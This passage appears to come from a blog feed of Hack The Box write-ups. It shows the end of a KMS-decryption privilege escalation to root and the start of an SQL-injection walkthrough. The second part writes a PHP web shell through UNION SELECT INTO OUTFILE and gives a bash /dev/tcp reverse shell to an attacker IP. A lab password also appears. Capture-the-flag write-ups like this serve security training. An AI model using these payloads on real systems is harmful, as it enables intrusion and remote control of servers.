</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">awslocal kms describe-key --key-id<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;2378914f-ea22-47af-8b0c-8252ef09cd5f&#34;</span>
<span style="color:#ff79c6">{</span>
    <span style="color:#f1fa8c">&#34;KeyMetadata&#34;</span>: <span style="color:#ff79c6">{</span>
        <span style="color:#f1fa8c">&#34;AWSAccountId&#34;</span>: <span style="color:#f1fa8c">&#34;000000000000&#34;</span>,
        <span style="color:#f1fa8c">&#34;KeyId&#34;</span>: <span style="color:#f1fa8c">&#34;2378914f-ea22-47af-8b0c-8252ef09cd5f&#34;</span>,
        <span style="color:#f1fa8c">&#34;Arn&#34;</span>: <span style="color:#f1fa8c">&#34;arn:aws:kms:us-east-1:000000000000:key/2378914f-ea22-47af-8b0c-8252ef09cd5f&#34;</span>,
        <span style="color:#f1fa8c">&#34;CreationDate&#34;</span>: 1609758003,
        <span style="color:#f1fa8c">&#34;Enabled&#34;</span>: true,
        <span style="color:#f1fa8c">&#34;Description&#34;</span>: <span style="color:#f1fa8c">&#34;Encryption and Decryption&#34;</span>,
        <span style="color:#f1fa8c">&#34;KeyUsage&#34;</span>: <span style="color:#f1fa8c">&#34;ENCRYPT_DECRYPT&#34;</span>,
        <span style="color:#f1fa8c">&#34;KeyState&#34;</span>: <span style="color:#f1fa8c">&#34;Enabled&#34;</span>,
        <span style="color:#f1fa8c">&#34;Origin&#34;</span>: <span style="color:#f1fa8c">&#34;AWS_KMS&#34;</span>,
        <span style="color:#f1fa8c">&#34;KeyManager&#34;</span>: <span style="color:#f1fa8c">&#34;CUSTOMER&#34;</span>,
        <span style="color:#f1fa8c">&#34;CustomerMasterKeySpec&#34;</span>: <span style="color:#f1fa8c">&#34;RSA_4096&#34;</span>,
        <span style="color:#f1fa8c">&#34;EncryptionAlgorithms&#34;</span>: <span style="color:#ff79c6">[</span>
            <span style="color:#f1fa8c">&#34;RSAES_OAEP_SHA_1&#34;</span>,
            <span style="color:#f1fa8c">&#34;RSAES_OAEP_SHA_256&#34;</span>
        <span style="color:#ff79c6">]</span>
    <span style="color:#ff79c6">}</span>
<span style="color:#ff79c6">}</span>
</code></pre></td></tr></table>
</div>
</div><p>we only want the KMS keys which are not <code>&quot;KeyState&quot;: &quot;Disabled&quot;</code> and <code>&quot;Enabled&quot;: true</code>. Because <code>grep -q Disabled</code> returns 0 when it does not find <code>Disabled</code>, then we we can use append <code>|| echo $id</code> to list out the key_id whenever the key is not disabled.</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">awslocal kms list-keys | grep KeyId | cut -d<span style="color:#f1fa8c">&#39;&#34;&#39;</span> -f4 | <span style="color:#ff79c6">while</span> <span style="color:#8be9fd;font-style:italic">read</span> id; <span style="color:#ff79c6">do</span> <span style="color:#8be9fd;font-style:italic">desc</span><span style="color:#ff79c6">=</span><span style="color:#ff79c6">$(</span>awslocal kms describe-key --key-id <span style="color:#8be9fd;font-style:italic">$id</span><span style="color:#ff79c6">)</span>; <span style="color:#8be9fd;font-style:italic">use</span><span style="color:#ff79c6">=</span><span style="color:#ff79c6">$(</span><span style="color:#8be9fd;font-style:italic">echo</span> <span style="color:#8be9fd;font-style:italic">$desc</span> | cut -d<span style="color:#f1fa8c">&#39;&#34;&#39;</span> -f26<span style="color:#ff79c6">)</span>; <span style="color:#8be9fd;font-style:italic">echo</span> <span style="color:#8be9fd;font-style:italic">$desc</span> | grep -q Disabled <span style="color:#ff79c6">||</span> <span style="color:#8be9fd;font-style:italic">echo</span> <span style="color:#f1fa8c">&#34;</span><span style="color:#8be9fd;font-style:italic">$id</span><span style="color:#f1fa8c">  </span><span style="color:#8be9fd;font-style:italic">$use</span><span style="color:#f1fa8c">&#34;</span>; <span style="color:#ff79c6">done</span>
0b539917-5eff-45b2-9fa1-e13f0d2c42ac  ENCRYPT_DECRYPT
16754494-4333-4f77-ad4c-d0b73d799939  ENCRYPT_DECRYPT
2378914f-ea22-47af-8b0c-8252ef09cd5f  ENCRYPT_DECRYPT
2bf9c582-eed7-482f-bfb6-2e4e7eb88b78  ENCRYPT_DECRYPT
53bb45ef-bf96-47b2-a423-74d9b89a297a  SIGN_VERIFY
804125db-bdf1-465a-a058-07fc87c0fad0  ENCRYPT_DECRYPT
837a2f6e-e64c-45bc-a7aa-efa56a550401  SIGN_VERIFY
881df7e3-fb6f-4c7b-9195-7f210e79e525  SIGN_VERIFY
c5217c17-5675-42f7-a6ec-b5aa9b9dbbde  SIGN_VERIFY
f0579746-10c3-4fd1-b2ab-f312a5a0f3fc  ENCRYPT_DECRYPT
f2358fef-e813-4c59-87c8-70e50f6d4f70  SIGN_VERIFY
</code></pre></td></tr></table>
</div>
</div><p>We only want those ENCRYPT_DECRYPT:</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">7
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">awslocal kms list-keys | grep KeyId | cut -d<span style="color:#f1fa8c">&#39;&#34;&#39;</span> -f4 | <span style="color:#ff79c6">while</span> <span style="color:#8be9fd;font-style:italic">read</span> id; <span style="color:#ff79c6">do</span> <span style="color:#8be9fd;font-style:italic">desc</span><span style="color:#ff79c6">=</span><span style="color:#ff79c6">$(</span>awslocal kms describe-key --key-id <span style="color:#8be9fd;font-style:italic">$id</span><span style="color:#ff79c6">)</span>; <span style="color:#8be9fd;font-style:italic">use</span><span style="color:#ff79c6">=</span><span style="color:#ff79c6">$(</span><span style="color:#8be9fd;font-style:italic">echo</span> <span style="color:#8be9fd;font-style:italic">$desc</span> | cut -d<span style="color:#f1fa8c">&#39;&#34;&#39;</span> -f26<span style="color:#ff79c6">)</span> ; <span style="color:#8be9fd;font-style:italic">echo</span> <span style="color:#8be9fd;font-style:italic">$desc</span> | grep -q Disabled <span style="color:#ff79c6">||</span> <span style="color:#8be9fd;font-style:italic">echo</span> <span style="color:#8be9fd;font-style:italic">$id</span> <span style="color:#8be9fd;font-style:italic">$use</span> ; <span style="color:#ff79c6">done</span> | grep ENCRYPT_DECRYPT | cut -d<span style="color:#f1fa8c">&#39; &#39;</span> -f1
0b539917-5eff-45b2-9fa1-e13f0d2c42ac
16754494-4333-4f77-ad4c-d0b73d799939
2378914f-ea22-47af-8b0c-8252ef09cd5f
2bf9c582-eed7-482f-bfb6-2e4e7eb88b78
804125db-bdf1-465a-a058-07fc87c0fad0
f0579746-10c3-4fd1-b2ab-f312a5a0f3fc
</code></pre></td></tr></table>
</div>
</div><p>Only one key does not fail to decrypt:</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">7
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">david@sink:~/Projects/Prod_Deployment$ awslocal kms decrypt <span style="color:#8be9fd;font-style:italic">help</span>
david@sink:~/Projects/Prod_Deployment$ awslocal kms decrypt --key-id 804125db-bdf1-465a-a058-07fc87c0fad0 --ciphertext-blob fileb://servers.enc --encryption-algorithm RSAES_OAEP_SHA_256
<span style="color:#ff79c6">{</span>
    <span style="color:#f1fa8c">&#34;KeyId&#34;</span>: <span style="color:#f1fa8c">&#34;arn:aws:kms:us-east-1:000000000000:key/804125db-bdf1-465a-a058-07fc87c0fad0&#34;</span>,
    <span style="color:#f1fa8c">&#34;Plaintext&#34;</span>: <span style="color:#f1fa8c">&#34;H4sIAAAAAAAAAytOLSpLLSrWq8zNYaAVMAACMxMTMA0E6LSBkaExg6GxubmJqbmxqZkxg4GhkYGhAYOCAc1chARKi0sSixQUGIry80vwqSMkP0RBMTj+rbgUFHIyi0tS8xJTUoqsFJSUgAIF+UUlVgoWBkBmRn5xSTFIkYKCrkJyalFJsV5xZl62XkZJElSwLLE0pwQhmJKaBhIoLYaYnZeYm2qlkJiSm5kHMjixuNhKIb40tSqlNFDRNdLU0SMt1YhroINiRIJiaP4vzkynmR2E878hLP+bGALZBoaG5qamo/mfHsCgsY3JUVnT6ra3Ea8jq+qJhVuVUw32RXC+5E7RteNPdm7ff712xavQy6bsqbYZO3alZbyJ22V5nP/XtANG+iunh08t2GdR9vUKk2ON1IfdsSs864IuWBr95xPdoDtL9cA+janZtRmJyt8crn9a5V7e9aXp1BcO7bfCFyZ0v1w6a8vLAw7OG9crNK/RWukXUDTQATEKRsEoGAWjYBSMglEwCkbBKBgFo2AUjIJRMApGwSgYBaNgFIyCUTAKRsEoGAWjYBSMglEwRAEATgL7TAAoAAA=&#34;</span>,
    <span style="color:#f1fa8c">&#34;EncryptionAlgorithm&#34;</span>: <span style="color:#f1fa8c">&#34;RSAES_OAEP_SHA_256&#34;</span>
<span style="color:#ff79c6">}</span>
</code></pre></td></tr></table>
</div>
</div><p>We obtain</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">david@sink:~/Projects/Prod_Deployment$ file servers
servers: gzip compressed data, from Unix, original size modulo 2^32 <span style="color:#bd93f9">10240</span>
david@sink:~/Projects/Prod_Deployment$ zcat ./servers &gt; decompressed
david@sink:~/Projects/Prod_Deployment$ file decompressed
decompressed: POSIX tar archive <span style="color:#ff79c6">(</span>GNU<span style="color:#ff79c6">)</span>
david@sink:~/Projects/Prod_Deployment$ tar xvf decompressed
servers.yml
servers.sig
david@sink:~/Projects/Prod_Deployment$ cat servers.yml
server:
  listenaddr: <span style="color:#f1fa8c">&#34;&#34;</span>
  port: <span style="color:#bd93f9">80</span>
  hosts:
    - certs.sink.htb
    - vault.sink.htb
defaultuser:
  name: admin
  pass: _uezduQ!EY5AHfe2
</code></pre></td></tr></table>
</div>
</div><p>This password works with sudo</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">david@sink:~/Projects/Prod_Deployment$ su
Password:
root@sink:/home/david/Projects/Prod_Deployment# cat /root/root.txt
7d10fc6a7291577657846bdb18cd0781
</code></pre></td></tr></table>
</div>
</div><h1 id="using-burp">Using Burp</h1>
<p>We need to copy the base64 version of <code>\xob</code> and then decode it in Burp:</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py">python3 <span style="color:#ff79c6">-</span>c <span style="color:#f1fa8c">&#34;import base64; print(base64.b64encode(bytes.fromhex(&#39;0b&#39;)).decode())&#34;</span>
Cw<span style="color:#ff79c6">==</span>
</code></pre></td></tr></table>
</div>
</div>]]></content></item><item><title>HTB - Validation</title><link>https://0xade1.github.io/posts/2021/09/htb-validation/</link><pubDate>Sun, 19 Sep 2021 00:54:12 +0800</pubDate><guid>https://0xade1.github.io/posts/2021/09/htb-validation/</guid><description>TCP port 80 Detect SQL Injection Using curl -i -vvv we can see there is redirection (code 302) with a Set-Cookies header in the response; We have to use curl -L -b cookies.txt to save the cookie in a file and follow redirection
1 curl -L -b cookiest.txt &amp;#39;http://10.10.11.116/#&amp;#39; -H &amp;#39;User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:91.0) Gecko/20100101 Firefox/91.0&amp;#39; -H &amp;#39;Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,_/_;q=0.8&amp;#39; -H &amp;#39;Accept-Language: en-GB,en;q=0.5&amp;#39; --compressed -H &amp;#39;Referer: http://10.</description><content type="html"><![CDATA[<h1 id="tcp-port-80">TCP port 80</h1>
<h2 id="detect-sql-injection">Detect SQL Injection</h2>
<p>Using <code>curl -i -vvv</code> we can see there is redirection (code 302) with a Set-Cookies header in the response; We have to use <code>curl -L -b cookies.txt</code> to save the cookie in a file and follow redirection</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">curl -L -b cookiest.txt <span style="color:#f1fa8c">&#39;http://10.10.11.116/#&#39;</span> -H <span style="color:#f1fa8c">&#39;User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:91.0) Gecko/20100101 Firefox/91.0&#39;</span> -H <span style="color:#f1fa8c">&#39;Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,_/_;q=0.8&#39;</span> -H <span style="color:#f1fa8c">&#39;Accept-Language: en-GB,en;q=0.5&#39;</span> --compressed -H <span style="color:#f1fa8c">&#39;Referer: http://10.10.11.116/&#39;</span> -H <span style="color:#f1fa8c">&#39;Content-Type: application/x-www-form-urlencoded&#39;</span> -H <span style="color:#f1fa8c">&#39;Origin: http://10.10.11.116&#39;</span> -H <span style="color:#f1fa8c">&#39;DNT: 1&#39;</span> -H <span style="color:#f1fa8c">&#39;Connection: keep-alive&#39;</span> -H <span style="color:#f1fa8c">&#39;Upgrade-Insecure-Requests: 1&#39;</span> -H <span style="color:#f1fa8c">&#39;Pragma: no-cache&#39;</span> -H <span style="color:#f1fa8c">&#39;Cache-Control: no-cache&#39;</span> --data-raw <span style="color:#f1fa8c">&#34;username=test&amp;country=Brazil&#39;&#34;</span>
</code></pre></td></tr></table>
</div>
</div><p>The result of the above shows a PHP error which is indicative of possible SQL injection:</p>
<pre tabindex="0"><code>&lt;b&gt;Fatal error&lt;/b&gt;:  Uncaught Error: Call to a member function fetch_assoc() on bool in /var/www/html/account.php:33
</code></pre><p>When Changing the payload with different comments syntax, we finally find there is no more error <code>Country%27 -- </code> which confirms SQL Injection for MariaDB or MySQL.</p>
<table>
<thead>
<tr>
<th>sqli</th>
<th>status</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>Country%27 union select 1 --</code></td>
<td>No error</td>
</tr>
<tr>
<td><code>Country%27 union select 1,2 --</code></td>
<td>Error</td>
</tr>
</tbody>
</table>
<p>So the query returns one column only</p>
<h2 id="attempt-file-injection">Attempt File Injection</h2>
<p>We knows it is PHP, so we can attempt to drop a shell.php file into <code>/var/ww/html</code> folder with this payload:</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql">Country<span style="color:#ff79c6">%</span><span style="color:#bd93f9">27</span> <span style="color:#ff79c6">union</span> <span style="color:#ff79c6">select</span> <span style="color:#f1fa8c">&#39;&lt;?php echo system($_GET[&#34;cmd&#34;]); ?&gt;&#39;</span> <span style="color:#ff79c6">INTO</span> OUTFILE <span style="color:#f1fa8c">&#39;/var/www/html/shell.php&#39;</span> <span style="color:#6272a4">-- -
</span></code></pre></td></tr></table>
</div>
</div><p>The response returns an error, but we can see the file http://10.10.11.116/shell.php does not returns 404 File Not Found which confirms it has been created.
The reason why we have an error is because nothing is being returned by the SQL query</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">curl -b cookies.txt http://10.10.11.116/shell.php<span style="color:#f1fa8c">\?</span>cmd<span style="color:#f1fa8c">\=</span>id
<span style="color:#8be9fd;font-style:italic">uid</span><span style="color:#ff79c6">=</span>33<span style="color:#ff79c6">(</span>www-data<span style="color:#ff79c6">)</span> <span style="color:#8be9fd;font-style:italic">gid</span><span style="color:#ff79c6">=</span>33<span style="color:#ff79c6">(</span>www-data<span style="color:#ff79c6">)</span> <span style="color:#8be9fd;font-style:italic">groups</span><span style="color:#ff79c6">=</span>33<span style="color:#ff79c6">(</span>www-data<span style="color:#ff79c6">)</span>
</code></pre></td></tr></table>
</div>
</div><h1 id="reverse-shell">Reverse Shell</h1>
<p>in burp repeater we can url-encode key characters only:</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">regular: bash -c <span style="color:#f1fa8c">&#34;bash -i &gt;&amp; /dev/tcp/10.10.14.85/9001 2&gt;&amp;1&#34;</span>
encoded: bash+-c+<span style="color:#f1fa8c">&#34;bash+-i+&gt;%26+/dev/tcp/10.10.14.85/9001+2&gt;%261
</span></code></pre></td></tr></table>
</div>
</div><p>We obatain a reverse shell:</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
